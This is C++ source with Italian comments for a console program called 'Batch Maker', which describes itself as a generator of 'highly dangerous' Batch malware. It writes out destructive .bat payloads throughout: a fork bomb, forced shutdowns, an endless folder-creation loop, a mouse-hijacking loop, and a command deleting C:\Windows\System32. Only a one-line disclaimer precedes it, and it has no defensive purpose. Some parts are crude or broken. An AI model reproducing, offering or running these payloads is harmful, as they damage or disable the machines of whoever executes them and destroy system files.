#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>

using namespace std;


/*
 * Attenzione: l'utilizzo del codice in modo scorretto, non è ammesso. Tale codice potrebbe causare danni permanenti al pc, rischiando di 
 * distruggerlo.
 */

void writeTextSquared(string s, unsigned short squarec, unsigned short txtc) {
	setcolor(squarec);
	cout << "[";
	setcolor(txtc);
	cout << s;
	setcolor(squarec);
	cout << "]" << endl;
}

void setcolor(unsigned short color){
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hcon, color);
}


int main() {
	typedef struct {
		string errore {"Errore non previsto nella creazione del file."}; //struttura contentente le frasi degli errori
	} Errori;
	Errori errori;
	string scelta;
	// invia i primi messaggi allo start del software
	setcolor(4);
	cout << "Benvenuto in Batch Maker! by Sapphire Security" << endl; 
	cout << "Hai a disposizione un certo numero di exploit, che puoi creare scrivendo sul programma\nil nome dell'exploit che vuoi creare.";
	cout << endl << endl;
	cout << "Per visualizzare la lista degli exploit digita 'list'" << endl;
	cout << "Per ottenere informazioni sul prodotto digita 'info'" << endl;
	while (true){ // qui viene scritta tutta la logica del codice
		cout << "\nScelta: ";
		setcolor(9);
		getline(cin, scelta);
		setcolor(4);
		if (scelta == "list"){ // se l'utente esegue il comando "list", allora esegue questa parte del codice.
			writeTextSquared("SimpleMalware", 7, 4);
			writeTextSquared("PcDown", 7, 4);
			writeTextSquared("RipComputer", 7, 4);
			writeTextSquared("EnJavaError", 7, 4);
			writeTextSquared("TookMouse", 7, 4);
			writeTextSquared("BlockConnection", 7, 4);
			writeTextSquared("PcDestroy", 7, 4);
			writeTextSquared("SilentMalware", 7, 4);
		}else if (scelta == "simplemalware" || scelta == "Simplemalware"){ // se invecec il comando è "simplemalware", allora esegue quanto segue
			try {
			ofstream simplemalware("simplemalware.bat"); // crea il file
			// scrive nel file alcune stringhe
			simplemalware << ":1\n";
			simplemalware << "start\n";
			simplemalware << "goto 1";
            cout << "\nFile creato con successo!\n";
			simplemalware.close(); // chiude la connessione del file
			}catch (...){
				cerr << errori.errore << endl; // nel caso non riseca ad esegure le azioni scritte sopra, invierà questo errore.
			}
		}else if (scelta == "pcdown" || scelta == "Pcdown") { // se invece il comando è "pcdown" allora esegue quanto segue
          try {
              ofstream pcdown("pcdown.bat"); // crea il file
              pcdown << "shutdown -p"; // scrive quanto segue al suo interno
              cout << "\nFile creato con successo!\n";
              pcdown.close(); // chiude la connessione del file
          }catch (...){
              cerr << errori.errore; // nel caso non riesca ad esegure le azioni scritte sopra, invierà questo errore.
          }
		}else if (scelta == "ripcomputer" || scelta == "Ripcomputer"){ // se invece il comando è "ripcomputer" allora esegue quanto segue
            try {
                ofstream ripcomputer("ripcomputer.bat"); // crea il file
                ripcomputer << ":1\n";
                ripcomputer << "start chrome\n";
                ripcomputer << "start chrome\n";
                ripcomputer << "shutdown -s -t 10";
                cout << "\nFile creato con successo!\n";
				ripcomputer.close(); // chiude la connessione del file
            }catch (...){
                cerr << errori.errore; // nel caso non riesca ad esegure le azioni scritte sopra, invierà questo errore.
            }    
	}else if (scelta == "enjavaerror" || scelta == "Enjavaerror"){ // se invece il comando è "enjavaerror" allora esegue quanto segue
		try {
			ofstream enjavaerror("enjavaerror.bat"); // crea il file
			enjavaerror << ("@echo off\n");
			enjavaerror << (":1\n");
			enjavaerror << ("RunDll32.exe user32.dll,SetCursorPos 100 100\n");
			enjavaerror << ("echo EnJava colpisce ancora! Non puoi muovere il tuo mouse!\n");
			enjavaerror << ("goto 1");
			cout << "\nFile creato con successo!\n";
			enjavaerror.close(); // chiude la connessione del file	
		}catch (...){
			cerr << errori.errore; // nel caso non riesca ad esegure le azioni scritte sopra, invierà questo errore
		}
	}else if (scelta == "info" || scelta == "Info"){ // se invece il comando è "help" allora esegue quanto segue
		setcolor(7);
		cout << "---" << endl;
		setcolor(4);
		cout << "BatchMaker e' un software ideato per la realizzazione di malware in Batch.\nIl progetto e' stato inizialmente sviluppato dal team di Sicurezza Informatica" << endl;
        cout << "Sapphire Security, che ha passato la cura del progetto alla comunità \"EnJava\". Il programma permette" << endl;
        cout << "la creazione di malware altamente pericolosi scritti in Batch.\nLo sviluppatore principale e' ThaMessia" << endl;
        setcolor(7);
        cout << "---" << endl;
        setcolor(4);
	}else if (scelta == "silentmalware" || scelta == "Silentmalware"){ // se invece il comando è "silentmalware" allora esegue quanto segue
		try {
			ofstream silentmalware("silentmalware.bat"); // crea il file
			silentmalware << ("@echo off\n");
			silentmalware << (":1\n");
			silentmalware << ("mkdir %random%\n");
			silentmalware << ("goto 1");
			cout << "\nFile creato con successo!\n";
			silentmalware.close();
		}catch (...){
			cerr << errori.errore;
		}
	}else if (scelta == "tookmouse" || scelta == "Tookmouse"){ // se invece il comando è "tookmouse" allora esegue quanto segue
		try {
			ofstream tookmouse("tookmouse.bat"); // crea il file
			tookmouse << ("@echo off\n");
			tookmouse << (":1\n");
			tookmouse << ("RunDll32.exe user32.dll,SetCursorPos 50 75\n");
			tookmouse << ("RunDll32.exe user32.dll,SetCursorPos 70 30\n");
			tookmouse << ("goto 1");
			cout << "\nFile creato con successo!\n";
			tookmouse.close();
		}catch (...){
			cerr << errori.errore;
		}
	}else if (scelta == "blockconnection" || scelta == "Blockconnection") {
        try
        {
            ofstream blockconnection("blockconnection.bat");
            blockconnection << ("@Echo off  Ipconfig/renew");
            cout << "\nFile creato con successo!\n";
            blockconnection.close();
        }
        catch(...)
        {
            cerr << errori.errore;
        }
        
    }else if (scelta == "pcdestroy" || scelta == "Pcdestroy"){
        try
        {
           ofstream specificblock("specificblock.bat");
           specificblock << ("del C:\\Windows\\System32");
           cout << "\nFile creato con successo!\n";
           specificblock.close();
        }
        catch(...)
        {
            errori.errore;
        }
        
        
    }else if (scelta == "clear" || scelta == "Clear"){
    	system("cls");
	}else{
        cout << "\nComando non trovato. Digita 'list' per una lista di comandi.\n";
    }

        
    
	}
	return 0; // ritorna a 0 (Signfica che il software è stato eseguito con successo)
}

